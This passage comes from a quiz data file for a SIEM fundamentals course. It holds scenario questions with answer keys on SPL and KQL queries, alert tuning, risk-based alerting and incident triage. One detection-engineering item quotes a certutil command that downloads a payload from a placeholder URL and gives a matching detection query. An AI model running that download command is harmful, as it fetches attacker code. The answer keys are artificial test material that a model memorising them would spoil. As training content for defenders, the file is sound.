          "Loop over each user in a foreach.",
          "Use index=*."
        ],
        correctAnswer: 1,
        explanation: "transaction is convenient but resource-heavy (forces a search-head reduce). When a shared key exists (LogonID, session_id, correlation_id), stats min/max + eval is dramatically cheaper because it's distributable. Reserve transaction for cases where ordering/state truly matters."
      },
      {
        id: "siem-q3-6",
        difficulty: "easy",
        tags: ["SPL"],
        scenario: "You write:\n  index=web | stats count by status\nresult shows just '200, 301, 404'. Your colleague wants the count visible too in a clean table.",
        question: "Minimal correct addition?",
        options: [
          "| chart count",
          "| table status count (after the stats — selects + orders the columns for display)",
          "| sort status",
          "| eval count=1"
        ],
        correctAnswer: 1,
        explanation: "stats already produces count and status; table just picks which fields to render and in what order. (D) would overwrite count with 1 — destructive."
      },
      {
        id: "siem-q3-7",
        difficulty: "medium",
        tags: ["KQL", "Time"],
        scenario: "You want sign-ins from the last 7 days, bucketed by HOUR, separated by Result (Success/Failure), for a time-series chart.",
        question: "Correct KQL?",
        options: [
          "SigninLogs | where TimeGenerated > ago(7d) | summarize Count = count() by bin(TimeGenerated, 1h), Result = iff(ResultType == 0, 'Success', 'Failure') | render timechart",
          "SigninLogs | take 100",
          "SigninLogs | summarize count() by ResultType",
          "SigninLogs | where TimeGenerated > now()"
        ],
        correctAnswer: 0,
        explanation: "bin(TimeGenerated, 1h) is KQL's time-bucket; iff/case maps numeric ResultType into human labels; render timechart finishes the series. (D) is empty (now is a single instant)."
      },
      {
        id: "siem-q3-8",
        difficulty: "hard",
        tags: ["SPL", "Lookups", "Enrichment"],
        scenario: "You maintain a CSV lookup 'threat_ips.csv' with columns ip, score, source. You want to enrich every proxy event with the threat score and filter to score > 80.",
        question: "Correct SPL?",
        options: [
          "index=proxy | lookup threat_ips.csv ip OUTPUT score source | where score > 80",
          "index=proxy AND threat_ips.csv",
          "index=proxy | join threat_ips",
          "index=proxy | dedup ip"
        ],
        correctAnswer: 0,
        explanation: "lookup is Splunk's enrichment primitive — it matches on the lookup's key (ip) and OUTPUTs the extra fields. Filter AFTER the lookup. join would also work but is far more expensive when a lookup file suffices."
      },
      {
        id: "siem-q3-9",
        difficulty: "medium",
        tags: ["KQL", "extend/project"],
        scenario: "You need to compute a derived field RiskTag = 'high' when failed sign-ins > 50 else 'low', per user.",
        question: "Which KQL is right?",
        options: [
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName | extend RiskTag = iff(Failed > 50, 'high', 'low')",
          "SigninLogs | project RiskTag = 'high'",
          "SigninLogs | summarize count() | where count > 50",
          "SigninLogs | take 50"
        ],
        correctAnswer: 0,
        explanation: "summarize first to get the per-user count; then extend adds a calculated column using iff. project would have worked too — extend is non-destructive (keeps existing columns), project picks an explicit set."
      },
      {
        id: "siem-q3-10",
        difficulty: "hard",
        tags: ["SPL", "Anomaly"],
        scenario: "You want to detect users whose data egress today is anomalously high vs their own 14-day baseline (z-score > 3).",
        question: "Which SPL approach is correct?",
        options: [
          "| stats sum(bytes_out) by user — done.",
          "Build a 14-day per-user baseline with stats avg, stdev; outer-join today's per-user sum; compute z = (today - avg) / stdev; alert where z > 3. (Or use streamstats / anomalydetection.)",
          "Threshold at a fixed 1 GB/day for everyone.",
          "Use top 10 every day."
        ],
        correctAnswer: 1,
        explanation: "Per-user behavioral baselines beat global thresholds because 'normal' differs per role (developers vs receptionists). The pattern: historic mean+stdev → join → z-score → threshold. Fixed thresholds (C) miss low-volume insiders and noise on high-volume users."
      },
      {
        id: "siem-q3-11",
        difficulty: "medium",
        tags: ["SPL", "Subsearch"],
        scenario: "You want all events from src_ip values that already triggered the 'high-risk' alert today (a small set — < 100 IPs).",
        question: "Which is correct AND efficient?",
        options: [
          "index=network [search index=alerts severity=high earliest=@d | stats values(src_ip) AS src_ip | table src_ip] — subsearch returns the IP list and is expanded into the outer search filter.",
          "index=network | join src_ip [search index=alerts]",
          "index=* alerts high",
          "index=network | where src_ip IN (alerts)"
        ],
        correctAnswer: 0,
        explanation: "Subsearches are perfect for SMALL result sets used as a filter — the inner search runs first, returns IPs, and the outer search filters at the indexers. join is the heavy-hammer alternative; subsearch with a small set is faster. Note the 10,500-row default subsearch cap."
      },
      {
        id: "siem-q3-12",
        difficulty: "easy",
        tags: ["KQL"],
        scenario: "You want to limit a noisy KQL query to the 20 most recent rows for quick inspection.",
        question: "Which is correct?",
        options: [
          "| take 20 — random 20 rows, not necessarily newest.",
          "| top 20 by TimeGenerated desc — guarantees the 20 most recent rows.",
          "| head 20 — KQL has no head operator.",
          "| limit"
        ],
        correctAnswer: 1,
        explanation: "Subtle but important: take returns ANY 20 rows (no guaranteed order), top N by field desc returns the actual newest. Use take for fast spot-checks, top by time for 'most recent'."
      },
      {
        id: "siem-q3-13",
        difficulty: "medium",
        tags: ["SPL", "Regex"],
        scenario: "URLs are buried in proxy raw events. You want a field 'domain' extracted in-flight without an admin-side parser change.",
        question: "Which SPL works?",
        options: [
          "| rex field=_raw \"https?://(?<domain>[^/]+)\"",
          "| eval domain=url",
          "| spath",
          "| extract"
        ],
        correctAnswer: 0,
        explanation: "rex applies a named-capture regex at search-time — the right tool for ad-hoc extraction without touching props.conf. For production, promote it to a permanent field extraction; for triage, rex is unbeatable."
      },
      {
        id: "siem-q3-14",
        difficulty: "hard",
        tags: ["KQL", "Performance"],
        scenario: "A KQL query over 30 days of SecurityEvent times out. You really need 30 days.",
        question: "Best optimization path?",
        options: [
          "Run it again and hope.",
          "Narrow at the source: project away unused columns EARLY (project-keep / project-away), apply where filters as the FIRST operators (not after parsing), use materialized views or summarize into a smaller table refreshed hourly, and let the analyst query the summary.",
          "Increase the timeout to 8 hours.",
          "Switch to SPL."
        ],
        correctAnswer: 1,
        explanation: "KQL perf rules: filter early, project columns away early, prefer materialized aggregations for repeated dashboards. The same '30 days of raw' search is often a 30-day pre-aggregation underneath plus a fast drill-down."
      },
      {
        id: "siem-q3-15",
        difficulty: "hard",
        tags: ["SPL", "Detection"],
        scenario: "You want: 'Service account whose number of distinct destination hosts in 1h > 5x its 7-day median' (lateral-movement signal).",
        question: "Sketch the SPL pattern.",
        options: [
          "index=auth | stats count",
          "index=auth account_type=service earliest=-1h | stats dc(dest_host) AS hosts_1h by user | join user [search index=auth account_type=service earliest=-7d@d latest=@d | bucket _time span=1h | stats dc(dest_host) AS h by user _time | stats median(h) AS median_hosts by user] | where hosts_1h > 5 * median_hosts",
          "index=auth | top user",
          "index=auth | head 1000"
        ],
        correctAnswer: 1,
        explanation: "Per-entity baseline vs current window is the lateral-movement bread-and-butter. Compute the 1h current value, compute the 7d historical hourly median, join on user, threshold on the ratio. Critical: filter to service accounts where 'fan-out' is genuinely anomalous."
      },
      {
        id: "siem-q3-16",
        difficulty: "medium",
        tags: ["KQL", "let / functions"],
        scenario: "You repeat the same 'risky user list' subquery in five Sentinel rules.",
        question: "Cleanest way to centralize?",
        options: [
          "Copy/paste — easy.",
          "Save it as a saved KQL function (or use let in a workspace function); each rule calls RiskyUsers() and the definition lives in ONE place.",
          "Hardcode the user list.",
          "Disable four of the rules."
        ],
        correctAnswer: 1,
        explanation: "KQL functions (workspace-level) are the DRY mechanism. One source of truth, change once, every dependent rule updates. Copy/paste guarantees drift between rules within weeks."
      },
      {
        id: "siem-q3-17",
        difficulty: "easy",
        tags: ["SPL"],
        scenario: "Your SPL: index=web | stats count by status. You want descending sort by count.",
        question: "Correct addition?",
        options: [
          "| sort count",
          "| sort -count",
          "| desc count",
          "| order count"
        ],
        correctAnswer: 1,
        explanation: "Splunk uses minus prefix for descending: sort -count. sort count ascends; the other syntaxes don't exist."
      },
      {
        id: "siem-q3-18",
        difficulty: "hard",
        tags: ["SPL", "tstats"],
        scenario: "You need a fast count of distinct src_ip per hour over 30 days for a dashboard.",
        question: "Which is dramatically faster?",
        options: [
          "index=fw | stats dc(src_ip) by date_hour — raw search across 30 days.",
          "| tstats summariesonly=true dc(All_Traffic.src) FROM datamodel=Network_Traffic.All_Traffic BY _time span=1h — queries accelerated tsidx summaries.",
          "Same speed.",
          "Run it serially per day and union."
        ],
        correctAnswer: 1,
        explanation: "tstats against an accelerated data model is typically 10–100x faster than equivalent stats over raw events, because it queries pre-built index metadata rather than scanning raw buckets. Acceleration cost is paid once at acceleration time, not per query."
      },
      {
        id: "siem-q3-19",
        difficulty: "medium",
        tags: ["KQL", "parse"],
        scenario: "A free-text Message field contains:\n  \"User jdoe logged in from 10.4.7.22 (session 9c1f)\"\nYou want extracted columns user, ip, session.",
        question: "Which KQL operator fits?",
        options: [
          "| project Message",
          "| parse Message with 'User ' user ' logged in from ' ip ' (session ' session ')'",
          "| summarize Message",
          "| extend user = Message"
        ],
        correctAnswer: 1,
        explanation: "parse (or parse-kv / extract regex) is KQL's pattern-based extractor — declares the literal markers and captures the variable parts into named columns. The cleanest tool for predictable free-text formats."
      },
      {
        id: "siem-q3-20",
        difficulty: "medium",
        tags: ["Detection Engineering"],
        scenario: "Final check before promoting a new rule to prod: it fires 3 times in the last 24h of test data — all 3 are true positives in your sample.",
        question: "Is it ready?",
        options: [
          "Yes — 100% precision in test, ship it.",
          "Not yet — 3 samples is statistically meaningless. Run it against ≥ 30 days of REAL production telemetry, measure expected fire rate and FP profile, document the runbook, and stage in 'monitor-only' mode for a tuning window before promoting to actionable.",
          "Yes — disable in 24h if noisy.",
          "Skip prod testing, push to prod."
        ],
        correctAnswer: 1,
        explanation: "Tiny test samples lie. The mature workflow: backtest against historic prod data, deploy in monitor-only (notable but no page), let it bake 1–2 weeks, tune, THEN promote to actionable. This is how you keep on-call from hating you."
      }
    ]
  },
  {
    quizId: "siem-q4",
    courseId: "siem-fundamentals",
    title: "Alert Tuning & Detection Quality",
    description: "Scenario quiz on building, tuning, and operating high-fidelity detections.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q4-1",
        difficulty: "medium",
        tags: ["FP Reduction"],
        scenario: "Rule 'Multiple Failed Logons' fires 1,200x/day. Triage shows: 95% from a vuln scanner (known IP), 4% from a misconfigured backup agent (known account), <1% true positives.",
        question: "Correct tuning sequence?",
        options: [
          "Disable the rule.",
          "Add explicit exceptions for (scanner IP, backup service account) at the rule level, document each exception with owner + review date, and keep the rule otherwise unchanged so genuine brute-force still fires.",
          "Raise the threshold to 10,000 so it stops firing.",
          "Ignore the alerts."
        ],
        correctAnswer: 1,
        explanation: "Targeted suppression of KNOWN-benign sources preserves detection on the unknown. Each exception is logged + reviewed periodically (scanner IPs change). Raising thresholds blindly (C) hides real attacks; disabling (A) is malpractice."
      },
      {
        id: "siem-q4-2",
        difficulty: "hard",
        tags: ["Detection Lifecycle"],
        scenario: "Your detection library has 412 rules. 60% of them have not fired in 12 months. The team debates: 'kill the silent ones' vs 'they're insurance, keep them.'",
        question: "Most defensible approach?",
        options: [
          "Delete every rule that hasn't fired in 12 months.",
          "Treat silence as a SIGNAL, not a verdict. For each silent rule: (1) is the underlying log source still ingesting? (2) is the rule logic still semantically correct? (3) is the threat still relevant? Kill rules that fail all three; fix the rest; keep ATT&CK-coverage rules even if silent (insurance).",
          "Keep all 412 forever.",
          "Random sample — delete half."
        ],
        correctAnswer: 1,
        explanation: "Silent rules are sometimes good detections waiting for a rare attack and sometimes dead weight masking blind spots. Disciplined detection lifecycle (review cadence, ATT&CK gap analysis, ingestion health correlation) separates the two — never bulk-delete."
      },
      {
        id: "siem-q4-3",
        difficulty: "medium",
        tags: ["Severity"],
        scenario: "A new rule 'PowerShell EncodedCommand executed' fires on every admin script (mostly benign) AND on real attacker tradecraft.",
        question: "Best handling?",
        options: [
          "Critical severity, page on every fire.",
          "Risk-based scoring: low severity by default; ESCALATE severity dynamically when combined with (a) parent process = Office app, (b) network beacon to new domain, or (c) running on a sensitive asset. Single signal → low; correlated signals → high.",
          "Disable the rule.",
          "Email all 200 fires to the SOC manager."
        ],
        correctAnswer: 1,
        explanation: "A single noisy signal becomes high-fidelity when correlated with context (parent process lineage, network, asset criticality). Risk-based alerting (Splunk RBA, Sentinel fusion, custom scoring) is the modern answer to 'good detection, too much noise.'"
      },
      {
        id: "siem-q4-4",
        difficulty: "medium",
        tags: ["Throttling"],
        scenario: "Same rule fires 400 times in 10 minutes from the SAME src_ip during an obvious scan. Your on-call gets 400 pages.",
        question: "Correct control?",
        options: [
          "Disable the rule for an hour.",
          "Configure throttling/de-duplication: ONE alert per (rule, src_ip) per 30-minute window, with a count field showing volume. Preserves visibility without flooding.",
          "Ignore pages.",
          "Lower severity globally."
        ],
        correctAnswer: 1,
        explanation: "Throttling/grouping keys (per src_ip, per user, per asset) prevent alert storms while preserving the underlying event count. The analyst still sees '400 events from 1.2.3.4' — they just get one ticket, not 400."
      },
      {
        id: "siem-q4-5",
        difficulty: "hard",
        tags: ["ATT&CK Coverage"],
        scenario: "Leadership asks: 'How good is our detection coverage?' You have 200 rules.",
        question: "Best way to answer?",
        options: [
          "'We have 200 rules — lots of coverage.'",
          "Map every rule to MITRE ATT&CK technique(s), publish a heatmap of covered vs uncovered techniques weighted by the threat profile relevant to your industry, and report (a) covered, (b) partially covered, (c) gaps. Coverage is a heatmap, not a single number.",
          "Count alerts per day.",
          "Show the SIEM uptime."
        ],
        correctAnswer: 1,
        explanation: "ATT&CK Navigator-style heatmaps are the industry-standard coverage artifact. Volume of rules is meaningless if they all detect the same technique. Maturity = breadth across the matrix, weighted by threats relevant to YOUR org."
      },
      {
        id: "siem-q4-6",
        difficulty: "medium",
        tags: ["Alert Quality"],
        scenario: "Two alerts arrive simultaneously:\n  Alert A: 'Suspicious activity detected on host01.' Severity: High.\n  Alert B: 'PowerShell base64-encoded download cradle from winword.exe child process on FIN-HR-04 (CFO laptop). MITRE T1059.001 / T1566. EDR confidence: 0.94.' Severity: High.\nBoth high. Which is a better-built alert and why?",
        question: "Choose:",
        options: [
          "A — shorter is better.",
          "B — names the technique, the host, the asset context, the parent/child chain, and the confidence. The analyst can prioritize and start investigating in seconds. Alert NAMING and CONTEXT are detection-engineering deliverables, not afterthoughts.",
          "They're equivalent.",
          "A — leaves room for analyst judgment."
        ],
        correctAnswer: 1,
        explanation: "Alert metadata IS the product. Required fields (per detection): what was seen, where, on what asset, MITRE mapping, confidence, suggested next step. 'Suspicious activity' alerts are how SOCs go bankrupt on attention."
      },
      {
        id: "siem-q4-7",
        difficulty: "easy",
        tags: ["Runbook"],
        scenario: "An analyst opens an alert and has no idea what to do next.",
        question: "What's missing?",
        options: [
          "A bigger SIEM.",
          "A runbook linked from the alert: triage steps, queries to pivot on, expected false-positive patterns, escalation criteria, containment options.",
          "More alerts.",
          "Higher severity."
        ],
        correctAnswer: 1,
        explanation: "Every production detection should ship with a runbook. The investment pays off on Day 1 when a junior analyst handles the alert as well as the engineer who wrote it. No runbook = silent operational debt."
      },
      {
        id: "siem-q4-8",
        difficulty: "hard",
        tags: ["Risk-Based Alerting"],
        scenario: "Instead of paging on every individual notable, you accumulate risk events on entities (users/hosts). A user with 5 medium-risk notables in 24h pages; a user with 1 high-risk notable also pages.",
        question: "This is:",
        options: [
          "Bad — every alert should page.",
          "Risk-Based Alerting (RBA): aggregates many low/medium signals into entity risk scores, paging only when accumulated risk crosses a threshold. Dramatically reduces page volume AND surfaces multi-step attacks that no single rule would have caught.",
          "The same as throttling.",
          "Splunk-only."
        ],
        correctAnswer: 1,
        explanation: "RBA is the modern shift from 'rule fires → page' to 'evidence accumulates on an entity → page when risky.' Catches slow, distributed attack chains; reduces analyst burnout. Implemented natively in Splunk ES RBA, Sentinel Fusion, custom in any SIEM."
      },
      {
        id: "siem-q4-9",
        difficulty: "medium",
        tags: ["FP Pattern"],
        scenario: "Your 'Mass File Access' rule fires every Monday morning on 'svc-backup'. Always benign.",
        question: "Correct fix?",
        options: [
          "Suppress all Monday alerts.",
          "Add a specific exception for the svc-backup account scoped to its known backup window AND only when accessing the backup target paths. Narrow exceptions, not blanket ones.",
          "Disable the rule on Mondays.",
          "Page anyway."
        ],
        correctAnswer: 1,
        explanation: "Narrow exceptions (account + path + time window) preserve detection if svc-backup is compromised and used outside its known pattern. Blanket time-based suppression is what attackers exploit."
      },
      {
        id: "siem-q4-10",
        difficulty: "medium",
        tags: ["Detection KPI"],
        scenario: "You're asked for the single best metric to track detection quality over time.",
        question: "Which?",
        options: [
          "Total alerts/day.",
          "Alert fidelity = TP / (TP + FP), tracked per rule and overall, alongside MTTD/MTTR. Rising fidelity = tuning is working; falling fidelity = ingest or environment changed and rules need attention.",
          "Number of rules.",
          "SIEM CPU usage."
        ],
        correctAnswer: 1,
        explanation: "Fidelity is the rule-level proxy for detection quality. Track per-rule (kill or tune the worst offenders), and globally (cross-team KPI). MTTD/MTTR complete the picture by measuring whether the alerts that DO fire are acted on quickly."
      }
    ]
  },
  {
    quizId: "siem-q5",
    courseId: "siem-fundamentals",
    title: "SIEM Fundamentals — Final Exam",
    description: "Comprehensive scenario-based exam covering architecture, onboarding, query, detection, and operations.",
    passingScore: 80,
    timeLimit: 45,
    questions: [
      {
        id: "siem-q5-1",
        difficulty: "medium",
        tags: ["Triage", "Brute Force"],
        scenario: "07:42 — Alert fires: 500 failed logons against acct 'admin' from 1 source IP in 10 minutes, followed by 1 SUCCESS from the same IP for the same account. The src_ip is external.",
        question: "First action?",
        options: [
          "Wait for more evidence.",
          "Treat as confirmed credential compromise: contain (disable account / force-reauth), pivot to find every session/host the account touched after the success event, preserve evidence, open IR ticket.",
          "Reset the password and close.",
          "Block the IP and close."
        ],
        correctAnswer: 1,
        explanation: "Brute-force followed by success = the attacker is in. Password reset alone doesn't kill active sessions. Containment + scope (where else has this account authenticated since the success?) + IR is the correct sequence."
      },
      {
        id: "siem-q5-2",
        difficulty: "hard",
        tags: ["SPL"],
        scenario: "Write SPL for: top 10 external src_ips by count of distinct internal users they attempted to authenticate as (failed) in the last 24h.",
        question: "Best query:",
        options: [
          "index=auth action=failure src_ip=10.* | top 10",
          "index=auth action=failure earliest=-24h NOT src_ip IN (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) | stats dc(user) AS unique_users by src_ip | sort -unique_users | head 10",
          "index=* failed | head 10",
          "index=auth | stats count by user"
        ],
        correctAnswer: 1,
        explanation: "Filter to failures, exclude RFC1918 (external only), distinct-count of users per IP (password-spray fingerprint), sort + head. Password spray attackers hit MANY accounts ONCE each — dc(user), not count, surfaces them."
      },
      {
        id: "siem-q5-3",
        difficulty: "medium",
        tags: ["KQL", "Impossible Travel"],
        scenario: "Sentinel alert: 'Impossible travel' — user signed in from Mumbai 14:02 IST, then São Paulo 14:31 IST.",
        question: "Before paging IR, what do you check first?",
        options: [
          "Disable the user.",
          "Check (1) is the second sign-in from a known corporate VPN/proxy egress? (2) is it the SAME UserAgent / device-id? (3) any preceding successful MFA? (4) Conditional Access risk score? Only escalate if context still looks anomalous.",
          "Ignore — probably VPN.",
          "Reset their password without notice."
        ],
        correctAnswer: 1,
        explanation: "Impossible-travel has a high benign-rate (VPNs, mobile carriers, satellite). Enriching with VPN/proxy/device/MFA context is mandatory triage. Both (A) blind containment and (C) blind dismissal are wrong."
      },
      {
        id: "siem-q5-4",
        difficulty: "medium",
        tags: ["Exfiltration"],
        scenario: "Possible data exfiltration suspected for user 'jdoe'. Which combination of SIEM data sources gives the strongest case?",
        question: "Best set:",
        options: [
          "Email only.",
          "Proxy/firewall outbound flows (volume + destination), DLP alerts, EDR file-access + USB events, CASB (sanctioned SaaS uploads), DNS — correlated by user/host over the suspected window.",
          "Just CloudTrail.",
          "Just authentication logs."
        ],
        correctAnswer: 1,
        explanation: "Exfil paths are diverse — corporate email, personal webmail, sanctioned SaaS, unsanctioned SaaS, USB, DNS tunneling, cloud sync. A defensible case correlates network + endpoint + identity + DLP. Single-source theories are easy to refute."
      },
      {
        id: "siem-q5-5",
        difficulty: "hard",
        tags: ["IR Timeline"],
        scenario: "You're rebuilding an incident timeline. Events come from EDR, firewall, proxy, AD, and Okta — all with different timestamp formats and some in local TZ.",
        question: "Critical prep step?",
        options: [
          "Sort by ingest_time and call it good.",
          "Normalize ALL timestamps to UTC at event_time before merging the timeline. Always cite event_time, not ingest_time. Verify NTP sync on contributing hosts; flag any clock-drift > 60s.",
          "Convert everything to IST.",
          "Ignore timestamps."
        ],
        correctAnswer: 1,
        explanation: "Timeline integrity stands on consistent event-time in UTC. Mixed TZ + clock drift = misleading attack narrative. ingest_time tells you when the SIEM received it (subject to lag); event_time tells you when it happened."
      },
      {
        id: "siem-q5-6",
        difficulty: "medium",
        tags: ["Notable Event", "Splunk ES"],
        scenario: "In Splunk ES, a correlation search produces a notable event. The analyst clicks it in Incident Review.",
        question: "What is the notable event?",
        options: [
          "A raw log line.",
          "A higher-order security event derived from one or more raw events by a correlation search, with status (New/In Progress/Closed), severity, owner, and adaptive-response actions attached. It's the unit of SOC work.",
          "A dashboard panel.",
          "A scheduled report."
        ],
        correctAnswer: 1,
        explanation: "Notables in ES (and 'Incidents' in Sentinel, 'Offenses' in QRadar) are first-class objects representing actionable security events. They're the surface the SOC works against — not the raw log."
      },
      {
        id: "siem-q5-7",
        difficulty: "easy",
        tags: ["Retention"],
        scenario: "Compliance says 'keep audit logs 1 year.' Your hot tier holds 30 days, warm 90 days, cold 365.",
        question: "Are you compliant?",
        options: [
          "No.",
          "Yes — the total retention envelope (30 + 90 + 365 days, with cold-tier search/restore capability) satisfies the 1-year requirement, provided the data is searchable on demand by auditors / IR.",
          "Only if everything is hot.",
          "Need 7 years."
        ],
        correctAnswer: 1,
        explanation: "Compliance cares about retention duration + retrievability, not which tier. The defensible architecture: tier by access pattern; document SLAs for cold-tier restore. Auditors accept tiered storage."
      },
      {
        id: "siem-q5-8",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "A new threat blog drops: 'Adversary uses certutil.exe -urlcache -split -f http://x/y.exe to download payloads.' You need a detection by EOD.",
        question: "Smallest, highest-fidelity SPL?",
        options: [
          "index=* certutil",
          "index=endpoint sourcetype=Sysmon EventID=1 process_name=certutil.exe (commandline=*-urlcache* OR commandline=*-split*) commandline=*http* — narrow on the LOLBin + the abusive flags + URL fetch pattern",
          "index=network http",
          "index=* | head 1000"
        ],
        correctAnswer: 1,
        explanation: "Detection precision = narrow on the abused capability (LOLBin) + the suspicious flag combination + the network artefact. 'certutil' alone (A) is noisy admin tooling; the flag combo is the attacker tell. Pair with allow-list for legit admins."
      },
      {
        id: "siem-q5-9",
        difficulty: "medium",
        tags: ["Threat Intel"],
        scenario: "You ingest a commercial threat-intel feed of 'malicious IPs'. After a week, your alerts are flooded with hits on those IPs visiting your public website.",
        question: "Why and fix?",
        options: [
          "TI feeds are useless.",
          "Inbound TI matches on a public-facing service are mostly internet noise (opportunistic scanners). Restrict TI matching to (a) OUTBOUND traffic from internal hosts, or (b) INBOUND only on non-public assets. Adds the context the feed lacks.",
          "Buy a bigger feed.",
          "Block every TI IP at the perimeter."
        ],
        correctAnswer: 1,
        explanation: "TI value depends on DIRECTION and ASSET. Outbound to a known-bad IP from an internal endpoint is high-signal (possible C2). Inbound from the same IP to your public web is the entire internet's daily noise. Scope alerts accordingly."
      },
      {
        id: "siem-q5-10",
        difficulty: "medium",
        tags: ["SOAR"],
        scenario: "Your SIEM integrates with SOAR. A phishing-URL alert fires.",
        question: "Smart automation?",
        options: [
          "Auto-delete the user's mailbox.",
          "Auto-enrichment + safe containment: detonate URL in sandbox, pull URL reputation, search Exchange for other recipients, propose (analyst-approved) bulk remediation. Reversible actions automate; irreversible actions stay analyst-gated.",
          "Page the CEO.",
          "Auto-disable the recipient's account."
        ],
        correctAnswer: 1,
        explanation: "SOAR maturity rule of thumb: automate REVERSIBLE actions (enrichment, sandbox, search), keep IRREVERSIBLE ones (account disable, host isolation in some orgs) human-approved with one-click approval. Builds analyst trust, prevents catastrophic auto-actions."
      },
      {
        id: "siem-q5-11",
        difficulty: "hard",
        tags: ["Lateral Movement"],
        scenario: "EDR shows a user account 'jdoe' authenticating to 27 distinct hosts in 12 minutes from a single workstation. jdoe is a helpdesk technician (so some breadth is normal).",
        question: "Best discriminator between 'normal' and 'compromised'?",
        options: [
          "Total host count alone — 27 is high, page.",
          "Compare to jdoe's OWN 30-day baseline (median distinct hosts/12min) AND to the helpdesk-cohort baseline. A user 5x above their personal AND cohort baseline is anomalous; a user matching their normal pattern is not.",
          "It's always benign for helpdesk.",
          "It's always malicious."
        ],
        correctAnswer: 1,
        explanation: "Per-entity + per-cohort baselines beat global thresholds for role-variable behavior. Helpdesk normal ≠ accountant normal. UEBA is exactly this discipline — relative anomaly detection rather than fixed thresholds."
      },
      {
        id: "siem-q5-12",
        difficulty: "medium",
        tags: ["Health"],
        scenario: "Friday 22:00: the 'Critical Brute Force' detection has not fired in 5 days, but historically fired daily. SOC manager is pleased.",
        question: "Correct response?",
        options: [
          "Send a 'detection working great!' email.",
          "Open a P2 'detection health' ticket. Verify (1) source ingestion volume vs baseline, (2) parser/field health for required fields, (3) any recent rule/parser/policy change. Sudden silence is a blind-spot warning.",
          "Disable the rule.",
          "Lower the threshold."
        ],
        correctAnswer: 1,
        explanation: "Anomalous quiet on historically active detections is one of the most-missed indicators of broken pipelines. Treat silence as a signal worth investigating, especially before weekends/holidays."
      },
      {
        id: "siem-q5-13",
        difficulty: "medium",
        tags: ["RBAC", "SIEM Admin"],
        scenario: "A Tier 1 analyst asks for permission to delete events from the index 'to clean up false positives'.",
        question: "Correct response?",
        options: [
          "Grant it — efficiency matters.",
          "Refuse. SIEM data is forensic evidence; deletion breaks audit/IR. The right tool is TUNING (suppressions, exceptions) so the events still exist but don't generate alerts. SIEM admin / delete rights stay tightly held and audited.",
          "Grant temporarily.",
          "Grant for one index."
        ],
        correctAnswer: 1,
        explanation: "Once events are gone, they're gone — including the ones an IR team needs in 6 months. Suppression (no alert) is reversible; deletion is not. SIEM admin is a privileged role on par with domain admin and should be treated as such."
      },
      {
        id: "siem-q5-14",
        difficulty: "hard",
        tags: ["Insider Threat"],
        scenario: "A finance user starts accessing source-control repos and S3 buckets they've never touched in 18 months — at 02:00 local time — 2 weeks before their resignation date (known to HR).",
        question: "What SIEM capability turns this into a usable signal?",
        options: [
          "A keyword alert on the word 'leaving'.",
          "UEBA / risk-scoring: HR feed marks the user as 'leaver', behavioral baselines flag the access deviation, off-hours adds risk, accumulated risk crosses threshold → investigation. Single events are weak; the score is the signal.",
          "Disable all leavers immediately.",
          "Don't monitor finance users."
        ],
        correctAnswer: 1,
        explanation: "Insider risk lives in correlation: HR context + behavioral baseline + time + asset sensitivity. UEBA + risk-based alerting are designed for this. Reactive 'disable on resignation' (C) is necessary but insufficient — exfil often happens BEFORE notice."
      },
      {
        id: "siem-q5-15",
        difficulty: "medium",
        tags: ["Cloud", "CloudTrail"],
        scenario: "CloudTrail event: a former contractor's API access key calls iam:CreateUser at 03:14 UTC. The contractor offboarded last week.",
        question: "Severity and first action?",
        options: [
          "Low — probably automation.",
          "Critical. Confirmed credential abuse + privilege escalation attempt by an account that should not exist. Immediately disable the access key, list every action that key has taken in the last 30 days, snapshot affected resources, open IR.",
          "Email the contractor.",
          "Wait for more activity."
        ],
        correctAnswer: 1,
        explanation: "Offboarded creds + privileged API call = active compromise. Containment first (disable key), scope second (full CloudTrail audit of the key), evidence preserved, IR engaged. Time-to-contain on cloud key abuse is everything — keys can spin up money-printing instances in minutes."
      },
      {
        id: "siem-q5-16",
        difficulty: "easy",
        tags: ["Sigma"],
        scenario: "A team-mate writes a new detection directly in Splunk SPL. Another writes the same logic in KQL for Sentinel. Both maintain their copies.",
        question: "What process improvement should you propose?",
        options: [
          "Standardize on Splunk only.",
          "Author detections in Sigma (vendor-neutral) as source-of-truth in Git; compile to SPL and KQL via sigmac/pySigma. One source, two backends, no drift.",
          "Standardize on KQL only.",
          "Keep doing both manually."
        ],
        correctAnswer: 1,
        explanation: "Sigma-first detection-as-code is the modern multi-SIEM standard. The detection LOGIC lives once in Git; the per-vendor SYNTAX is generated. Eliminates the inevitable drift between hand-maintained copies."
      },
      {
        id: "siem-q5-17",
        difficulty: "hard",
        tags: ["Maturity"],
        scenario: "Two SOCs:\n  SOC A: 10 TB/day ingest, 1,200 vendor-default rules, no MITRE mapping, no tuning cadence, 4,000 alerts/day.\n  SOC B: 2 TB/day ingest, 280 custom + Sigma-managed rules, mapped to ATT&CK with a quarterly gap review, 60 alerts/day, RBA-paged.\nWhich is more mature?",
        question: "Answer:",
        options: [
          "A — bigger ingest = better.",
          "B — focused data, intentional detections aligned to threats, measured coverage, sustainable alert volume. Maturity is OUTCOMES (catch rate, MTTD, MTTR, analyst sustainability), not ingest size.",
          "Equally mature.",
          "Neither."
        ],
        correctAnswer: 1,
        explanation: "Volume is the most-misused SIEM metric. Mature SOCs measure detection coverage and outcomes; immature SOCs measure 'how much data we have.' SOC A is the textbook 'expensive log archive masquerading as a SIEM.'"
      },
      {
        id: "siem-q5-18",
        difficulty: "medium",
        tags: ["Investigation"],
        scenario: "You start with a single indicator — a suspicious external domain. You want every related event across all data sources.",
        question: "Tradecraft term for this and the SIEM workflow?",
        options: [
          "Throttling.",
          "Pivoting: take the indicator (domain), search across DNS, proxy, firewall, EDR for ANY event referencing it; surface internal hosts that touched it; pivot again from those hosts to their other activity. Each pivot expands scope until the full intrusion picture forms.",
          "Throttling.",
          "Suppression."
        ],
        correctAnswer: 1,
        explanation: "Pivoting is the core investigation primitive — turn each newly discovered artefact into a new search until the intrusion graph is complete. Good SIEMs make pivots one-click; great analysts know what to pivot ON next."
      },
      {
        id: "siem-q5-19",
        difficulty: "hard",
        tags: ["Anti-Forensics", "1102"],
        scenario: "Windows Security Event ID 1102 ('audit log cleared') fires on a domain controller at 04:01 UTC. No scheduled maintenance.",
        question: "Treatment?",
        options: [
          "Low — admin probably cleared it.",
